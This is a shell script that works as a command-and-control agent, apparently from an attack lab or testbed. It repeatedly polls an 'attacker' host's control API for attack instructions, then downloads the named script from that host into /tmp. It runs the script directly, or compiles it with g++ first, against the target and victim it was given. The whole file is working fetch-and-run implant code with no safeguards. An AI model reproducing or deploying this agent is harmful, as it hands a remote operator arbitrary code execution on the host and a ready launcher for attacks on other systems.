#!/bin/sh

set -eux

ATT_HOST="${ATTACKER_HOST:-attacker}"
API_PORT="${ATTACKER_CTRL_PORT:-8001}"
POLL=1

LAST=""
PID=""

kill_old() {
  [ -n "$PID" ] && kill "$PID" 2>/dev/null || true
  wait "$PID" 2>/dev/null || true
}

while true; do
  RESP="$(curl -s "http://$ATT_HOST:$API_PORT/attack")"
  SCRIPT="${RESP%%|*}"
  REST="${RESP#*|}"
  TARGET="${REST%%|*}"
  VICTIM="${REST#*|}"

  if [ "$SCRIPT" != "$LAST" ]; then
    echo "[agent] attack -> '$SCRIPT' on '$TARGET'"
    kill_old
    LAST="$SCRIPT"

    if [ -n "$SCRIPT" ]; then
      URL="http://$ATT_HOST:$API_PORT/scripts/$SCRIPT"
      TMP="/tmp/$SCRIPT"
      echo "[agent] fetching $URL"
      if curl -sf "$URL" -o "$TMP"; then
        chmod +x "$TMP"
        case "${SCRIPT##*.}" in
          sh)
            "$TMP" "$TARGET" "$VICTIM" &
            PID=$!
            ;;
          cpp)
            BIN="/tmp/${SCRIPT%.cpp}"
            if g++ -O2 -std=c++11 "$TMP" -o "$BIN"; then
              chmod +x "$BIN"
              "$BIN" "$TARGET" "$VICTIM" &
              PID=$!
            else
              echo "[agent] compile failed: $SCRIPT" >&2
              LAST=""
            fi
            ;;
          *)
            echo "[agent] unknown extension: $SCRIPT" >&2
            LAST=""
            ;;
        esac
      else 
        echo "[agent] failed to download $SCRIPT" >&2
        LAST=""
      fi
    fi
  fi

  sleep "$POLL"
done
